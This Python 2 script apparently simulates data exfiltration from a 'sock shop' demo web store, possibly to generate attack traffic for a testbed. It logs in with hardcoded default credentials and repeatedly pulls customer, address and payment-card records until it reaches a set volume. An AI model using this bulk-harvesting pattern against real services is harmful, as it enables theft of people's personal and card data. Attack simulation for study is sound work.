import time
import base64
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession
import parameters

'''
USAGE: python exfil_data_v2.py [addr of sock shop]
note: 
'''
# amt is the amt to exfiltrate within one 5 sec period.
def exfiltrate_data():
    cur_time = time.time()
    amt_exfil = 0
    data_exfiltrated = []
    
    # use the big calls to do as much of the exfil as possible
    # note: these values are approximate
    AMT_IN_CUSTOMERS = 431000
    AMT_IN_ADDRESSES = 306000
    AMT_IN_CARDS = 238000
    while (amt - amt_exfil)  / AMT_IN_CUSTOMERS >= 1:
        exfil_data = requests.get(addr + "/customers/")
        amt_exfil  = amt_exfil + len(exfil_data.content)

    while (amt - amt_exfil)  / AMT_IN_ADDRESSES >= 1:
        exfil_data = requests.get(addr + "/addresses/")
        amt_exfil  = amt_exfil + len(exfil_data.content)

    while (amt - amt_exfil)  / AMT_IN_CARDS >= 1:
        exfil_data = requests.get(addr + "/cards/")
        amt_exfil  = amt_exfil + len(exfil_data.content)

    # finish the rest with smaller calls
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=20))
    base64string = base64.encodestring('%s:%s' % ('user', 'password')).replace('\n', '')
    login = requests.get(addr + "/login", headers={"Authorization":"Basic %s" % base64string})
    while amt_exfil < int(amt):
        exfil_data_fut = session.get(addr + "/customers/azc", cookies=login.cookies)
        exfil_data_fut_1 = session.get(addr + "/customers/frc", cookies=login.cookies)
        exfil_data_fut_2 = session.get(addr + "/customers/vpp", cookies=login.cookies)
        exfil_data_fut_3 = session.get(addr + "/customers/add", cookies=login.cookies)
        exfil_data_fut_4 = session.get(addr + "/customers/rep", cookies=login.cookies)
        exfil_data = exfil_data_fut.result()
        exfil_data_1 = exfil_data_fut_1.result()
        exfil_data_2 = exfil_data_fut_2.result()
        exfil_data_3 = exfil_data_fut_3.result()
        exfil_data_4 = exfil_data_fut_4.result()
        print exfil_data.text
        amt_exfil = amt_exfil + len(exfil_data.content) + len(exfil_data_1.content) + len(exfil_data_2.content)
        amt_exfil = amt_exfil + len(exfil_data_3.content) + len(exfil_data_4.content)
        print len(exfil_data.content), amt_exfil
    print "that took: ", time.time() - cur_time, " seconds" 

if __name__=="__main__":
    if len(sys.argv) < 1:
        print "triggered"
    addr= sys.argv[1]
    amt = parameters.amt_to_exfil
    exfiltrate_data()
